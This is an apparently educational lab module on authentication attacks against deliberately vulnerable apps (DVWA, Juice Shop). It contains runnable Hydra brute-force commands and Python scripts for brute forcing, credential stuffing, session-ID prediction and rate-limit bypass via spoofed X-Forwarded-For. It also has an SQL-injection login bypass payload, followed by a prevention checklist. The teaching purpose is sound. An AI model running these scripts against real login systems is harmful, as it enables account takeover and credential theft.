# Intermediate Module 1: Authentication Attacks

**Difficulty:** ⭐⭐ Intermediate  
**Time Required:** 3 hours  
**Prerequisites:** Completed Beginner modules

---

## Learning Objectives

By the end of this module, you will be able to:

- Perform brute force attacks on login forms
- Understand and exploit weak session management
- Conduct credential stuffing attacks
- Bypass rate limiting and account lockouts
- Implement secure authentication practices

---

## Authentication Fundamentals

### What Makes Authentication Weak?

| Weakness | Description | Risk |
|----------|-------------|------|
| No rate limiting | Unlimited login attempts | Brute force |
| Weak passwords | Simple/common passwords | Dictionary attacks |
| No account lockout | No penalty for failures | Automated attacks |
| Predictable sessions | Sequential/time-based IDs | Session hijacking |
| No MFA | Single factor only | Credential theft |

---

## Exercise 1.1: Brute Force with Hydra

### Setup

1. Navigate to DVWA → Brute Force
2. Set security to **Low**

### Create Password List

```bash
# In Kali pod
cat > /tmp/passwords.txt << 'EOF'
password
123456
admin
letmein
welcome
monkey
dragon
master
qwerty
login
password123
admin123
root
toor
abc123
EOF
```

### Analyze the Login Form

```bash
# Check how the form works
curl -v "http://dvwa-service.vulnerable-apps.svc.cluster.local/vulnerabilities/brute/" \
  -H "Cookie: security=low; PHPSESSID=YOUR_SESSION"
```

### Hydra Attack

```bash
# HTTP GET form brute force
hydra -l admin -P /tmp/passwords.txt \
  dvwa-service.vulnerable-apps.svc.cluster.local \
  http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: security=low; PHPSESSID=YOUR_SESSION:Username and/or password incorrect"
```

### Understanding Hydra Parameters

| Parameter | Meaning |
|-----------|---------|
| `-l admin` | Single username |
| `-L users.txt` | Username list |
| `-P passwords.txt` | Password list |
| `http-get-form` | HTTP GET method |
| `:Username and/or password incorrect` | Failure string |
| `H=Cookie\:` | Add cookie header |

### Expected Output

```
[80][http-get-form] host: dvwa-service   login: admin   password: password
```

<details>
<summary>✅ Solution</summary>

The password is `password`. Hydra found it by trying each password in the list.

</details>

---

## Exercise 1.2: Custom Python Brute Forcer

### Why Custom Scripts?

- More control over the attack
- Can handle complex authentication
- Easier to add custom logic
- Better for learning

### Python Brute Force Script

```python
#!/usr/bin/env python3
"""
DVWA Brute Force Script
"""
import requests
import sys

TARGET = "http://dvwa-service.vulnerable-apps.svc.cluster.local/vulnerabilities/brute/"
COOKIES = {"security": "low", "PHPSESSID": "YOUR_SESSION_ID"}
SUCCESS_TEXT = "Welcome to the password protected area"
FAILURE_TEXT = "Username and/or password incorrect"

def brute_force(username, password_file):
    print(f"[*] Starting brute force for user: {username}")
    
    with open(password_file, 'r') as f:
        passwords = [line.strip() for line in f]
    
    for i, password in enumerate(passwords):
        params = {
            "username": username,
            "password": password,
            "Login": "Login"
        }
        
        try:
            response = requests.get(TARGET, params=params, cookies=COOKIES)
            
            if SUCCESS_TEXT in response.text:
                print(f"\n[+] SUCCESS! Password found: {password}")
                return password
            else:
                print(f"[-] Attempt {i+1}: {password} - Failed")
                
        except Exception as e:
            print(f"[!] Error: {e}")
    
    print("\n[-] Password not found in wordlist")
    return None

if __name__ == "__main__":
    username = sys.argv[1] if len(sys.argv) > 1 else "admin"
    wordlist = sys.argv[2] if len(sys.argv) > 2 else "/tmp/passwords.txt"
    
    brute_force(username, wordlist)
```

### Run the Script

```bash
# Save the script
cat > /tmp/brute.py << 'SCRIPT'
#!/usr/bin/env python3
import requests
import sys

TARGET = "http://dvwa-service.vulnerable-apps.svc.cluster.local/vulnerabilities/brute/"
COOKIES = {"security": "low", "PHPSESSID": "YOUR_SESSION"}

def brute_force(username, password_file):
    print(f"[*] Brute forcing user: {username}")
    with open(password_file) as f:
        for line in f:
            password = line.strip()
            params = {"username": username, "password": password, "Login": "Login"}
            r = requests.get(TARGET, params=params, cookies=COOKIES)
            if "Welcome" in r.text:
                print(f"[+] FOUND: {username}:{password}")
                return
            print(f"[-] Tried: {password}")
    print("[-] Not found")

brute_force(sys.argv[1] if len(sys.argv) > 1 else "admin", 
            sys.argv[2] if len(sys.argv) > 2 else "/tmp/passwords.txt")
SCRIPT

python3 /tmp/brute.py admin /tmp/passwords.txt
```

---

## Exercise 1.3: Session Analysis

### Weak Session IDs in DVWA

Navigate to: DVWA → Weak Session IDs

### Low Security - Sequential IDs

```bash
# Make multiple requests and observe the session ID
for i in {1..5}; do
  curl -s "http://dvwa-service.vulnerable-apps.svc.cluster.local/vulnerabilities/weak_id/" \
    -H "Cookie: security=low; PHPSESSID=YOUR_SESSION" \
    -c - | grep dvwaSession
done
```

**Output:**
```
dvwaSession=1
dvwaSession=2
dvwaSession=3
dvwaSession=4
dvwaSession=5
```

The session IDs are simply incremented!

### Medium Security - Time-Based IDs

Set security to **Medium**:

```bash
for i in {1..3}; do
  curl -s "http://dvwa-service.vulnerable-apps.svc.cluster.local/vulnerabilities/weak_id/" \
    -H "Cookie: security=medium; PHPSESSID=YOUR_SESSION" \
    -c - | grep dvwaSession
  sleep 1
done
```

**Output:**
```
dvwaSession=1699999997
dvwaSession=1699999998
dvwaSession=1699999999
```

These are Unix timestamps - predictable if you know when the user logged in!

### Session Prediction Script

```python
#!/usr/bin/env python3
import time
import requests

TARGET = "http://dvwa-service.vulnerable-apps.svc.cluster.local/vulnerabilities/weak_id/"
COOKIES = {"security": "medium", "PHPSESSID": "YOUR_SESSION"}

# Try to predict session IDs based on current timestamp
current_time = int(time.time())

print("[*] Trying session IDs around current timestamp...")
for offset in range(-10, 11):
    session_id = current_time + offset
    test_cookies = {**COOKIES, "dvwaSession": str(session_id)}
    
    r = requests.get(TARGET, cookies=test_cookies)
    if "Welcome" in r.text or r.status_code == 200:
        print(f"[+] Valid session ID: {session_id}")
```

<details>
<summary>✅ Key Takeaway</summary>

Session IDs should be:
- Random (unpredictable)
- Long enough to prevent brute force
- Regenerated after login
- Transmitted securely (HTTPS)

</details>

---

## Exercise 1.4: Credential Stuffing

### What is Credential Stuffing?

Using leaked credentials from one breach to access accounts on other sites.

### Simulated Attack

```bash
# Create a "leaked" credentials file
cat > /tmp/leaked_creds.txt << 'EOF'
admin:password
admin:admin123
gordonb:abc123
pablo:letmein
user:password123
test:test
EOF

# Try each credential pair
while IFS=: read -r user pass; do
  echo -n "Trying $user:$pass... "
  RESULT=$(curl -s "http://dvwa-service.vulnerable-apps.svc.cluster.local/vulnerabilities/brute/?username=$user&password=$pass&Login=Login" \
    -H "Cookie: security=low; PHPSESSID=YOUR_SESSION")
  
  if echo "$RESULT" | grep -q "Welcome"; then
    echo "SUCCESS!"
  else
    echo "Failed"
  fi
done < /tmp/leaked_creds.txt
```

### Multi-Threaded Version

```python
#!/usr/bin/env python3
import requests
from concurrent.futures import ThreadPoolExecutor
import sys

TARGET = "http://dvwa-service.vulnerable-apps.svc.cluster.local/vulnerabilities/brute/"
COOKIES = {"security": "low", "PHPSESSID": "YOUR_SESSION"}

def try_login(cred):
    user, passwd = cred.strip().split(':')
    params = {"username": user, "password": passwd, "Login": "Login"}
    r = requests.get(TARGET, params=params, cookies=COOKIES)
    if "Welcome" in r.text:
        return f"[+] VALID: {user}:{passwd}"
    return None

with open("/tmp/leaked_creds.txt") as f:
    creds = f.readlines()

with ThreadPoolExecutor(max_workers=10) as executor:
    results = executor.map(try_login, creds)
    for r in results:
        if r:
            print(r)
```

---

## Exercise 1.5: Bypassing Rate Limiting

### Common Rate Limiting Bypasses

| Technique | How it Works |
|-----------|--------------|
| IP rotation | Use different source IPs |
| Header manipulation | X-Forwarded-For, X-Real-IP |
| Case variation | Admin vs admin vs ADMIN |
| Parameter pollution | Multiple username params |
| Slow attacks | Stay under threshold |

### X-Forwarded-For Bypass

```python
#!/usr/bin/env python3
import requests
import random

TARGET = "http://target/login"

def random_ip():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

passwords = ["password", "123456", "admin", "letmein"]

for pwd in passwords:
    headers = {
        "X-Forwarded-For": random_ip(),
        "X-Real-IP": random_ip()
    }
    # Each request appears to come from a different IP
    r = requests.post(TARGET, data={"username": "admin", "password": pwd}, headers=headers)
```

### Timing-Based Evasion

```python
import time
import random

for password in passwords:
    # Random delay between 2-5 seconds
    delay = random.uniform(2, 5)
    time.sleep(delay)
    
    # Make request
    try_login(password)
```

---

## Exercise 1.6: Juice Shop Authentication

### SQL Injection Login Bypass

```bash
# Login as admin using SQL injection
curl -X POST "http://juice-shop-service.vulnerable-apps.svc.cluster.local:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'\''--","password":"anything"}'
```

The `'--` comments out the password check!

### Password Reset Exploitation

1. Go to "Forgot Password" in Juice Shop
2. Try common security questions for admin@juice-sh.op
3. Hint: Check the `/ftp` directory for clues

### JWT Analysis

```bash
# Login and get JWT
TOKEN=$(curl -s -X POST "http://juice-shop-service.vulnerable-apps.svc.cluster.local:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"test123"}' | jq -r '.authentication.token')

# Decode JWT (base64)
echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null | jq .
```

<details>
<summary>✅ JWT Structure</summary>

```json
{
  "status": "success",
  "data": {
    "id": 1,
    "email": "test@test.com",
    "role": "customer"
  },
  "iat": 1699999999,
  "exp": 1700003599
}
```

What if we could change `role` to `admin`?

</details>

---

## Knowledge Check

1. What makes a brute force attack successful?
2. Why are sequential session IDs dangerous?
3. What is credential stuffing?
4. How can X-Forwarded-For help bypass rate limiting?
5. What's wrong with time-based session IDs?

<details>
<summary>✅ Answers</summary>

1. No rate limiting, no account lockout, weak passwords
2. Attackers can predict valid session IDs
3. Using leaked credentials from one site on another
4. Makes each request appear to come from a different IP
5. Predictable if you know approximate login time

</details>

---

## Prevention

### Secure Authentication Checklist

- [ ] Rate limiting (progressive delays)
- [ ] Account lockout after N failures
- [ ] CAPTCHA after failures
- [ ] Strong password requirements
- [ ] Multi-factor authentication
- [ ] Secure session generation (random, long)
- [ ] Session timeout and rotation
- [ ] HTTPS everywhere
- [ ] Credential breach monitoring

### Secure Session Configuration

```php
// PHP secure session settings
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_secure', 1);
ini_set('session.use_strict_mode', 1);
ini_set('session.cookie_samesite', 'Strict');
session_regenerate_id(true); // Regenerate on login
```

---

## Challenge Lab

### Scenario

You've discovered a login page. Your mission:

1. Enumerate valid usernames
2. Brute force passwords for discovered users
3. Identify session management weaknesses
4. Bypass any rate limiting
5. Document the complete attack chain

### Tools Allowed

- Hydra
- Custom Python scripts
- Burp Suite (if available)
- curl

<details>
<summary>✅ Challenge Solution</summary>

**1. Username Enumeration:**

```bash
# Different error messages reveal valid users
curl -s "http://target/login" -d "user=admin&pass=wrong" 
# "Invalid password" vs "User not found"
```

**2. Brute Force:**

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-post-form "/login:user=^USER^&pass=^PASS^:Invalid password"
```

**3. Session Analysis:**

```bash
# Collect and analyze session tokens
for i in {1..10}; do
  curl -c - http://target/login | grep session
done | sort | uniq -c
```

**4. Rate Limit Bypass:**

```python
# Rotate X-Forwarded-For header
headers = {"X-Forwarded-For": f"10.0.0.{i}"}
```

</details>

---

## Summary

In this module, you learned:

- ✅ Brute force with Hydra and Python
- ✅ Session management vulnerabilities
- ✅ Credential stuffing attacks
- ✅ Rate limiting bypass techniques
- ✅ Secure authentication practices

### Next Steps

Continue to: **Intermediate Module 2: CSRF and IDOR**

---

## Quick Reference

### Hydra Commands

```bash
# HTTP GET form
hydra -l user -P pass.txt target http-get-form "/login:u=^USER^&p=^PASS^:failed"

# HTTP POST form
hydra -l user -P pass.txt target http-post-form "/login:u=^USER^&p=^PASS^:failed"

# Basic auth
hydra -l user -P pass.txt target http-get /admin

# With cookies
hydra ... "H=Cookie: session=abc"
```

### Session Analysis

```bash
# Collect cookies
curl -c cookies.txt http://target/login

# Analyze entropy
echo "session_id" | wc -c
```
